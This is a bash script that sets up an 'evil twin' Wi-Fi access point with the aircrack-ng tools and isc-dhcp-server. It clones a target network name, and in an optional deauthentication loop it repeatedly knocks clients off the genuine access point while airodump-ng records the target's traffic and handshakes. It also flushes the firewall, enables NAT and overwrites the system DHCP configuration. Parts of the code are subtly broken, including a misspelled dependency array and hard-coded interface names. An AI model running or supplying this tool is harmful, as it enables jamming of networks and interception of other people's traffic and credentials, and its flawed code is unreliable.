#!/bin/bash
currentdir=$(pwd)
clear
dependences=('konsole' 'xterm')
headers(){
	echo '----------------------------------------------------------------------------------------------------'
	echo 'GENERATE ACCESS POINT'
	echo '----------------------------------------------------------------------------------------------------'
}
echo 'Verifing dependences!'
for l in "${dependeces[@]}"
do
	if [[ $(which $l) == '' ]]; then
		echo "[-] $l not found! Installing..."
		apt-get install $l
	else
		echo "[+] $l is installed!"
	fi
done

if [[ $(which dhcpd) == '' ]]; then
	echo '[-] dhcpd not found! Installing...'
	apt-get install isc-dhcp-server
else
	echo '[+] dhcpd is installed!'
fi

sleep 3
clear
headers
echo 'Please select the interface (use only interfaces with wireless extensions)'
echo '----------------------------------------------------------------------------------------------------'
iwconfig|awk '/wlan/ {print $1}'|cut -d / -f1
read -p '-> ' interface
interface=${interface/'mon'/''}
echo '----------------------------------------------------------------------------------------------------'
echo 'What is the name for the new network?'
echo '----------------------------------------------------------------------------------------------------'
read -p '-> ' essid_local
date=$(date)
date="$essid_local $date"
mkdir "$date"
echo '----------------------------------------------------------------------------------------------------'
pkill airbase-ng
pkill dhcpd
pkill xterm
if [[ -f 'dhcpd_default_fap.conf' ]]; then
	rm dhcpd_default_fap.conf
fi
airmon-ng stop $interface"mon"
#network directions
network="192.168.10"
subnet=$network".0"
netmask="255.255.255.0"
i_range=$network".100"
e_range=$network".200"
gateway=$network".1"
dns_on="8.8.8.8"
#Default configuration for access point for routing
echo "#Default configuration for access point">>dhcpd_default_fap.conf
echo "subnet $subnet netmask $netmask {">>dhcpd_default_fap.conf
echo "  range $i_range $e_range;">>dhcpd_default_fap.conf
echo "  option routers $gateway;">>dhcpd_default_fap.conf
echo "  option domain-name-servers $dns_on;">>dhcpd_default_fap.conf
echo "}">>dhcpd_default_fap.conf
#start access point
airmon-ng start $interface
clear
headers
echo 'Set network with password? (lower case)'
echo '----------------------------------------------------------------------------------------------------'
read -p '->> (yes or not) ' password_case
echo $password_case
while [[ $password_case != 'yes' && $password_case != 'not' ]]
do
	read -p '->> (yes or not) ' password_case
	echo $password_case
done
echo '----------------------------------------------------------------------------------------------------'
echo "Deauth $essid_local from the area? (lower case)"
echo '----------------------------------------------------------------------------------------------------'
read -p '->> (yes or not) ' deauth_case
echo $deauth_case
while [[ $deauth_case != 'yes' && $deauth_case != 'not' ]]
do
	read -p '->> (yes or not) ' deauth_case
	echo $deauth_case
done
ap_network='Unique'
if [[ $deauth_case == 'yes' ]]; then
	xterm -e "airodump-ng $interface""mon" &
	sleep 5
	ver_bssid=$(aireplay-ng wlan0mon --deauth 10 -e "$essid_local"|awk '/Found BSSID/ {print $3}')
	sleep 5
	pkill xterm
	sleep 5
	ver_bssid=${ver_bssid//' '/''}
	if [[ $ver_bssid != '' ]]; then
		ver_bssid=${ver_bssid//'"'/''}
		echo 'Runing deauth status!'
		echo "$essid_local with $ver_bssid deauth is run!"
		sleep 3
		xterm -e "while true; do konsole -e airodump-ng $interface""mon --bssid $ver_bssid -w '$currentdir/$date/$essid_local'; pkill konsole; done" &
		#airodump-ng wlan0mon --bssid 00:00:00:00:00:00 -c 00 --showack -w outputfile
		sleep 3
		xterm -e "while true; do aireplay-ng  $interface""mon --deauth 100 -e '$essid_local' -a $ver_bssid; done" &
		ap_network='Duplicate'
	else
		echo "$essid_local: No such BSSID avalible!"
		ap_network='Unique'
	fi
fi
sleep 30
clear
headers
echo "Set all values for $interface with ESSID: $essid_local ($ap_network)"
echo "Interface: $interface"
echo "ESSID: $essid_local"
echo "Network: $network"
echo "Subnet: $subnet"
echo "Netmask: $netmask"
echo "From: $i_range To: $e_range"
echo "Gateway: $gateway"
echo "DNS: $dns_on"
echo '----------------------------------------------------------------------------------------------------'
echo "Starting proccess please wait..."
if [[ $password_case == 'yes' ]]; then
	xterm -e "airbase-ng -e '$essid_local' -c 10 -v -Z 4 $interface""mon" &
else
	xterm -e "airbase-ng -e '$essid_local' -c 10 -v $interface""mon" &
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o wlan10 -j MASQUERADE
sleep 10
ifconfig at0 up
ifconfig at0 $gateway netmask $netmask
route add -net $subnet netmask $netmask gw $gateway
if [[ -f 'etc/dhcp/dhcpd.conf.back' ]]; then
	echo 'dhcpd.conf got backup file!'
else
	cp '/etc/dhcp/dhcpd.conf' '/etc/dhcp/dhcpd.conf.back'
	sleep 2
	rm '/etc/dhcp/dhcpd.conf'
	echo 'dhcpd.conf backup file has been created!'
fi
sleep 3
if [[ -f '/etc/dhcp/dhcpd_default_fap.conf' ]]; then
	echo 'dhcpd_default_fap.conf exist!'
	sleep 2
	mv '/etc/dhcp/dhcpd_default_fap.conf' '/etc/dhcp/dhcpd.conf'
	sleep 2
else
	cp "$currentdir/dhcpd_default_fap.conf" "/etc/dhcp/dhcpd_default_fap.conf"
	sleep 2
	mv '/etc/dhcp/dhcpd_default_fap.conf' '/etc/dhcp/dhcpd.conf'
	sleep 2
fi
sleep 3
if [[ -f '/var/lib/dhcp/dhcpd.leases' ]]; then
	echo 'Storage file is ready!'
else
	touch '/var/lib/dhcp/dhcpd.leases'
	echo 'Storage file has been created and is ready!'
fi
xterm -e "dhcpd -d -f -cf '/etc/dhcp/dhcpd.conf' at0" &
echo 'The AP is ready!'
if [[ -f 'dhcpd_default_fap.conf' ]]; then
	rm dhcpd_default_fap.conf
fi
echo 'Finished...'
